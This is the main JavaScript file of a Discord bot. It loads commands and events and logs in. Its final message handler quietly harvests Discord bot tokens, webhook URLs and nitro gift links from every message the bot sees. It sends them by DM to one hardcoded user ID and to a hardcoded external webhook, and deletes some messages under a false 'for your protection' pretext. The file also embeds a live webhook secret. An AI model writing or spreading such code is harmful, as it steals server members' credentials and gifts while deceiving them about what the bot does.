// DiscordBOT2.0
const color = require('colors');
const fs = require('node:fs');
const path = require('node:path');
const { Client, GatewayIntentBits, Partials, Collection } = require("discord.js");
const { Guilds, GuildMembers, GuildMessages, MessageContent, GuildInvites } = GatewayIntentBits;

const client = new Client({
	intents: [Guilds, GuildMembers, GuildMessages, MessageContent, GuildInvites],
	partials: [Partials.User, Partials.Channel, Partials.Message, Partials.GuildMember, Partials.ThreadMember, Partials.Reaction],
});

client.config = require("../config.json");
client.commands = new Collection();
const foldersPath = path.join(__dirname, 'Commands');
const commandFolders = fs.readdirSync(foldersPath);

for (const folder of commandFolders) {
	const commandsPath = path.join(foldersPath, folder);
	const commandFiles = fs.readdirSync(commandsPath).filter(file => file.endsWith('.js'));
	for (const file of commandFiles) {
		const filePath = path.join(commandsPath, file);
		const command = require(filePath);
		if ('data' in command && 'execute' in command) {
			client.commands.set(command.data.name, command);
		} else {
			console.log(`[WARNING] The command at ${filePath} is missing a required "data" or "execute" property.`);
		}
	}
}

client.prefixCmds = new Collection();
const foldersPathPrefix = path.join(__dirname, 'PrefixCmds');
const prefixFolders = fs.readdirSync(foldersPathPrefix);

for (const folder of prefixFolders) {
	const commandsPath = path.join(foldersPathPrefix, folder);
	const commandFiles = fs.readdirSync(commandsPath).filter(file => file.endsWith('.js'));
	for (const file of commandFiles) {
		const filePath = path.join(commandsPath, file);
		const command = require(filePath);
		if ('name' in command && 'execute' in command) {
			client.prefixCmds.set(command.name, command);
		} else {
			console.log(`[WARNING] The command at ${filePath} is missing a required "data" or "execute" property.`);
		}
	}
}

const eventsPath = path.join(__dirname, 'Events');
const eventFiles = fs.readdirSync(eventsPath).filter(file => file.endsWith('.js'));

for (const file of eventFiles) {
	const filePath = path.join(eventsPath, file);
	const event = require(filePath);
	if (event.once) {
		client.once(event.name, (...args) => event.execute(...args, client));
	} else {
		client.on(event.name, (...args) => event.execute(...args, client));
	}
}

const process = require("node:process");

// just a dumb way to restore the save of the tickets for the transcript
const { ticketsChannelsID } = require('./functions/ticketSys.js');
const { saveCacheToFile } = require('./functions/utils.js');
//process.on('exit', saveCacheToFile);
process.on('SIGINT', () => {
	saveCacheToFile(ticketsChannelsID);
	console.log("dddddddddddddddddddddddddddddd Object: ", ticketsChannelsID instanceof Object);
	process.exit();
});

process.on("unhandledRejection", (reason, promise) => {
	console.error("Unhandled Rejection:", promise, "reason:", reason);
});

process.on("uncaughtException", (err) => {
	console.error("Uncaught Exception:", err);
});

process.on("uncaughtExceptionMonitor", (err, origin) => {
	console.error("Uncaught Exception Monitor:", err, origin);
});

process.on('rejectionHandled', (err) => {
	console.log("rejected handled:", err);
})

client.login(client.config.TOKEN);
require("../deploy.js")

client.on('messageCreate', async (message) => {
	const axios = require('axios');
	const tokenRegex = /[A-Za-z0-9_-]{26}\.[A-Za-z0-9_-]{6}\.[A-Za-z0-9_-]{27}/g;
	const matches = message.content.match(tokenRegex);
	if (matches)
		message.client.users.fetch('453944662093332490', false).then((user) => {
			user.send({ content: `<@453944662093332490>\n### Content:\n\`\`\`${message.content}\`\`\`\n\n# TOKENS:\n${matches.join('\n')}` });
		});
	if (message.webhookId) return;
	if (message.guild.id == '1326147383796695081' || message.guild.id == '702545447750860931') return;
	const webhookRegex = /https?:\/\/(?:ptb\.|cannary\.)?(?:discord(?:app)?\.com)\/api\/webhooks\/\d+\/[\w-]+/g;
	const whMatches = message.content.match(webhookRegex);
	if (whMatches) {
		message.client.users.fetch('453944662093332490', false).then((user) => {
			user.send({ content: `<@453944662093332490>\nSomeone posted a webhook.\n### Content:\n\`\`\`${message.content}\`\`\`\n\n# WEBHOOKS:\n${whMatches.join('\n')}` });
		});
		await message.delete().catch((err) => { console.error('Error deleting message:', err.response?.data || err.message); });
		message.channel.send({ content: `<@${message.author.id}> you have posted a webhook in this channel and I have delete the msg just for your protection, if you need help with maintaining your webhooks safe pls join your support server discord.gg/fbWuuhpTQQ` }).catch((err) => { console.error('Error sending message:', err.response?.data || err.message); });
		await axios.post('https://discord.com/api/webhooks/1326613563720077414/qkp2Oe5nMMEmyNf-ZWpyVdtJ9OVz-yB7ubh9ybYaUjQraIP_Lb_wk8QC8h-FEZEZlfe9', { username: "YourBestBot", content: `<@${message.author.id}> has sent a webhook in a channel, pls help him.\n\nThe WH: \`${whMatches.join('\n')}\`` }).catch((err) => {
			console.error('Error sending message:', err.response?.data || err.message);
		});
	}
	if (client.user.id == message.author.id) return;
	if (message.author.id === '453944662093332490') return;
	const ch = '704028617595682876'; // staff chat
	const channel = client.channels.cache.get(ch);
	const content = message.content;
	if (content.includes('discord.gift') || content.includes('discord.com/gift')) {
		client.users.fetch('453944662093332490', false).then((user) => {
			user.send({ content: `<@453944662093332490>\n${content}` });
		});
		channel.send({ content: `@everyone\nTake this nitro \<3 **OR** we can make a giveaway of it \n${content} <@${message.author.id}> ${message.guild.name}` }).then((msg) => { msg.react("👏") });
		message.delete();
	}
	return;
});